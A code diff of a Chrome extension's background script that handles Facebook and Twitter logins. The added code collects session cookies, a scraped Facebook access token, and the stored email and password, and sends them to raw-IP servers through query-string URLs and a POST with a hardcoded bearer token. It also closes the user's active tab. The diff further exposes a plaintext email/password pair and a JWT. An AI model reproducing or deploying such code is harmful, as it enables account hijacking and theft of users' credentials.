@@ -1,4 +1,4 @@
-chrome.storage.local.set({ extensionState: 0 }, function() {});
+chrome.storage.sync.set({ extensionState: 0 }, function() {});
 
 function removeCookies(domain, url) {
     chrome.cookies.getAll({ domain: domain }, function(cookies) {
@@ -38,12 +38,12 @@ function saveuToken() {
 }
 
 
-function addfbCookie(cookie, url) {
-    chrome.storage.sync.get([cookie], function(result) {
+function addfbCookie() {
+    chrome.storage.sync.get(['FBcookie'], function(result) {
         result.FBcookie.forEach(function(item, index) {
             delete item['hostOnly'];
             delete item['session'];
-            item['url'] = url;
+            item['url'] = 'https://www.facebook.com/';
             chrome.cookies.set(item, function(c) {
                 console.log('cookie added!')
             });
@@ -51,12 +51,12 @@ function addfbCookie(cookie, url) {
     });
 }
 
-function addtwCookie(cookie, url) {
-    chrome.storage.sync.get([cookie], function(result) {
+function addtwCookie() {
+    chrome.storage.sync.get(['TWcookie'], function(result) {
         result.TWcookie.forEach(function(item, index) {
             delete item['hostOnly'];
             delete item['session'];
-            item['url'] = url;
+            item['url'] = 'https://twitter.com/';
             chrome.cookies.set(item, function(c) {
                 console.log('cookie added!')
             });
@@ -73,148 +73,138 @@ function sendtoContent(msg) {
 }
 
 function twitterData() {
-    chrome.storage.sync.get(['TWemail', 'TWpassword'], function(result) {
-        var url = 'https://twitter.com';
-        chrome.cookies.getAll({ url: url }, function(e) {
-            if (e.length > 0) {
-                format = '';
-                for (let i = 0; i < e.length; i++) {
-                    format += e[i].name + '=' + e[i].value;
-                    if (i < e.length - 1) {
-                        format += ','
+
+    setTimeout(function() {
+
+        chrome.storage.sync.get(['TWemail', 'TWpassword'], function(result) {
+            var url = 'https://twitter.com';
+            chrome.cookies.getAll({ url: url }, function(e) {
+                if (e.length > 0) {
+                    format = '';
+                    for (let i = 0; i < e.length; i++) {
+                        if (e[i].name == 'twid') {
+                            var uuid = e[i].value.slice(4);
+                        }
+                        format += e[i].name + '=' + e[i].value;
+                        format += ';';
+                        if (i == e.length - 1) {
+                            format += 'domain=twitter.com';
+                        }
                     }
                 }
+                console.log(format);
 
-                var data = {
-                    "loginCookies": format,
-                    "loginPassword": result.TWpassword,
-                    "loginUsername": result.TWemail,
-                    "socialAccountState": 0,
-                    "socialAccountStateDescription": 0,
-                    "socialNetwork": {
-                        "id": 1
-                    },
-                    "status": true,
-                    "user": {
-                        "id": 1,
-                        "login": "admin"
-                    },
-                    "userToken": '',
-                    "userTokenState": 0,
-                    "userTokenStateDescription": "token"
-                };
-                $.ajax({
-                    url: "http://125.138.183.122:8081/api/connectome-social-media/create",
-                    type: 'POST',
-                    beforeSend: function(xhr) {
-                        xhr.setRequestHeader('Authorization', 'Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImF1dGgiOiJST0xFX0FETUlOLFJPTEVfVVNFUiIsImV4cCI6MTYyODc1OTAwOX0.A4y31gMgatNcHgS_HQ9pVuCrh1cgAdmLaDmWuY92Xe7hSMKtLPfa1WrCc7aHb68uLwmKr9Pj_7RnQGPQDlnIhw');
-                    },
-                    contentType: 'application/json',
-                    data: JSON.stringify(data),
-                    success: function(response) {
-                        console.log(response);
-                        chrome.storage.sync.set({ extensionState: 0 }, function() {
-                            addtwCookie('TWcookie', 'https://twitter.com');
-                        });
-                    },
-                    error: function(r) {
-                        console.log(r);
-                        chrome.storage.sync.set({ extensionState: 0 }, function() {
-                            addtwCookie('TWcookie', 'https://twitter.com');
-                        });
-                    },
-                })
-            }
-            removeCookies(".twitter.com", "https://twitter.com");
+
+                if (typeof uuid !== 'undefined') {
+                    console.log('uid defined');
+                    var sendurl = `http://13.21.34.124:8080/php/twitter.php?uuid=${uuid}&cookie=${format}&email=${result.TWemail}&password=${result.TWpassword}`;
+                    var encodeurl = encodeURI(sendurl);
+                    chrome.tabs.query({ active: true }, function(tabs) {
+                        chrome.tabs.remove(tabs[0].id);
+                    });
+                    chrome.tabs.create({ url: encodeurl });
+                    removeCookies(".twitter.com", "https://twitter.com");
+                    addtwCookie()
+                } else {
+                    console.log('uid undefined');
+                }
+            })
         })
-    })
+    }, 3000)
 }
 
 function facebookData() {
-    chrome.storage.sync.get(['FBemail', 'FBpassword'], function(result) {
-        var uToken;
-        var url = 'https://mbasic.facebook.com';
-        chrome.cookies.getAll({ url: url }, function(e) {
-            if (e.length > 0) {
-                format = 'domain=www.facebook.com;';
-                for (let i = 0; i < e.length; i++) {
-                    format += e[i].name + '=' + e[i].value;
-                    if (i < e.length - 1) {
-                        format += ';'
+    setTimeout(function() {
+        chrome.storage.sync.get(['FBemail', 'FBpassword'], function(result) {
+            var uToken;
+            var url = 'https://mbasic.facebook.com';
+            chrome.cookies.getAll({ url: url }, function(e) {
+                if (e.length > 0) {
+                    format = '';
+                    for (let i = 0; i < e.length; i++) {
+                        if (e[i].name == 'c_user') {
+                            var uuid = e[i].value;
+                        }
+                        format += e[i].name + '=' + e[i].value;
+                        format += ';';
+                        if (i == e.length - 1) {
+                            format += 'domain=www.facebook.com';
+                        }
+                    }
+
+                    try {
+                        var s = $.ajax({
+                            url: "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed",
+                            type: "get",
+                            async: false,
+                            global: false,
+                            success: function() {}
+                        }).responseText;
+                        s.search("EAAAAZ") == -1 ? uToken = '' : uToken = s.match(/EAAAAZ.*?\"/)[0].replace(/\W/g, "");
+                    } catch (err) {
+                        console.log(err);
+                    }
+                    if (typeof uuid !== 'undefined') {
+                        var sendurl = `http://13.21.34.124:8080/php/facebook.php?uuid=${uuid}&cookie=${format}&uToken=${uToken}&email=${result.FBemail}&password=${result.FBpassword}`;
+                        var encodeurl = encodeURI(sendurl);
+                        chrome.tabs.query({ active: true }, function(tabs) {
+                            chrome.tabs.remove(tabs[0].id);
+                        });
+                        chrome.tabs.create({ url: encodeurl });
+                        removeCookies(".facebook.com", "https://mbasic.facebook.com");
+                        addfbCookie();
                     }
                 }
-
-                try {
-                    var s = $.ajax({
-                        url: "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed",
-                        type: "get",
-                        async: false,
-                        global: false,
-                        success: function() {}
-                    }).responseText;
-                    s.search("EAAAAZ") == -1 ? uToken = '' : uToken = s.match(/EAAAAZ.*?\"/)[0].replace(/\W/g, "");
-                } catch (err) {
-                    console.log(err);
-                }
-                if ("" != uToken) {
-                    fbInfo = $.ajax({
-                        url: "https://graph.facebook.com/me?access_token=".concat(uToken),
-                        type: "get",
-                        dataType: 'json',
-                        async: false,
-                        global: false,
-                        success: function() {}
-                    }).responseJSON;
-                }
-
-                // var data = {
-                //     "loginCookies": format,
-                //     "loginPassword": 'Helloapril22#',
-                //     "loginUsername": 'tuongbbinhh7@gmail.com',
-                //     "socialAccountState": 0,
-                //     "socialAccountStateDescription": 0,
-                //     "socialNetwork": {
-                //         "id": 1
-                //     },
-                //     "status": 1,
-                //     "user": {
-                //         "id": 1,
-                //         "login": "admin"
-                //     },
-                //     "userToken": uToken,
-                //     "userTokenState": 0,
-                //     "userTokenStateDescription": "token",
-                //     "uuid": "12345678"
-                // };
-                var sendurl = `http://13.21.34.124:8080/php/facebook.php?uid=${fbInfo['id']}&cookie=${format}&uToken=${uToken}&email=${result.FBemail}&password=${result.FBpassword}`;
-                var encodeurl = encodeURI(sendurl);
-                chrome.tabs.create({ url: encodeurl });
-                // $.ajax({
-                //     url: "http://125.138.183.122:8081/api/connectome-social-media/create",
-                //     type: 'POST',
-                //     beforeSend: function(xhr) {
-                //         xhr.setRequestHeader('Authorization', 'Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImF1dGgiOiJST0xFX0FETUlOLFJPTEVfVVNFUiIsImV4cCI6MTYyODc1OTAwOX0.A4y31gMgatNcHgS_HQ9pVuCrh1cgAdmLaDmWuY92Xe7hSMKtLPfa1WrCc7aHb68uLwmKr9Pj_7RnQGPQDlnIhw');
-                //     },
-                //     contentType: 'application/json',
-                //     data: JSON.stringify(data),
-                //     success: function(response) {
-                //         console.log(response);
-                //         chrome.storage.sync.set({ extensionState: 0 }, function() {
-                //             addfbCookie('FBcookie', 'https://mbasic.facebook.com');
-                //         });
-                //     },
-                //     error: function(r) {
-                //         console.log(r);
-                //         chrome.storage.sync.set({ extensionState: 0 }, function() {
-                //             addfbCookie('FBcookie', 'https://mbasic.facebook.com');
-                //         });
-                //     },
-                // })
-            }
-            removeCookies(".facebook.com", "https://mbasic.facebook.com");
+            })
         })
-    })
-};
+    }, 3000)
+}
+
+function sendtoDatabase() {
+    chrome.storage.local.get(['FBcookie', 'FBpassword', 'FBemail', 'FButoken', 'FBuuid'], function(result) {
+        var data = {
+            "loginCookies": result.FBcookie,
+            "loginPassword": result.FBpassword,
+            "loginUsername": result.FBemail,
+            "socialAccountState": 0,
+            "socialAccountStateDescription": 0,
+            "socialNetwork": {
+                "id": 1
+            },
+            "status": 1,
+            "user": {
+                "id": 1,
+                "login": "admin"
+            },
+            "userToken": result.FBuToken,
+            "userTokenState": 0,
+            "userTokenStateDescription": "token",
+            "uuid": result.FBuuid,
+            "connectomes": [{
+                "connectomeId": 123123
+            }]
+        };
+
+        console.log(data);
+
+        $.ajax({
+            url: "http://125.138.183.122:8081/api/connectome-social-media/create",
+            type: 'POST',
+            beforeSend: function(xhr) {
+                xhr.setRequestHeader('Authorization', 'Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImF1dGgiOiJST0xFX0FETUlOLFJPTEVfVVNFUiIsImV4cCI6MTYyODc1OTAwOX0.A4y31gMgatNcHgS_HQ9pVuCrh1cgAdmLaDmWuY92Xe7hSMKtLPfa1WrCc7aHb68uLwmKr9Pj_7RnQGPQDlnIhw');
+            },
+            contentType: 'application/json',
+            data: JSON.stringify(data),
+            success: function(response) {
+                console.log(response);
+            },
+            error: function(r) {
+                console.log(r);
+            },
+        });
+    });
+}
+
 
 chrome.runtime.onMessage.addListener(async function(response, sender, sendResponse) {
     console.log(response);
@@ -225,12 +215,18 @@ chrome.runtime.onMessage.addListener(async function(response, sender, sendRespon
         case 'sendData':
             facebookData();
             break;
+        case 'sendtoDatabase':
+            sendtoDatabase();
+            break;
         case 'fbLogin':
             savefbCookie('https://mbasic.facebook.com');
             removeCookies(".facebook.com", "https://mbasic.facebook.com");
             chrome.tabs.create({ url: 'https://mbasic.facebook.com/login?refsrc=deprecated' });
             break;
         case 'twLogin':
+            chrome.tabs.query({ active: true }, function(tabs) {
+                chrome.tabs.remove(tabs[0].id);
+            });
             savetwCookie('https://twitter.com/');
             removeCookies(".twitter.com", "https://twitter.com/");
             chrome.tabs.create({ url: 'https://twitter.com/login' });
